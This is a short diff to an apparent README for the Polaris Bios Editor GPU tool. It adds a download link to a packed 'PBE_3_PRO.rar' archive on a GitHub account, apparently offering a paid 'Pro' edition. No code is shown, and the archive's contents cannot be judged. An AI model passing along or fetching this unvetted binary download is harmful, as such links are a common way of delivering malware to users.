@@ -18,8 +18,8 @@ If you’ve purchased PBE before 26 Febraury 2018, contact me via e-mail with or
 
 Read how to activate your PBE license in FAQ
 
-# Polaris Bios Editor 3 Pro
+## [Download Polaris Bios Editor 3 Pro](https://github.com/Gujjargit/PolarisBiosEditorPRO3/releases/download/PBE3PRO/PBE_3_PRO.rar)
 ![image](https://user-images.githubusercontent.com/98729987/212381117-30cb5693-9e2f-47f7-b3f2-c77e61a35a1f.png)
 
-# Polaris Bios Editor 1.6.7
+## Polaris Bios Editor 1.6.7
 ![image](https://user-images.githubusercontent.com/98729987/212380932-ea5d7b57-423c-49b1-bfa3-831fb17fbceb.png)
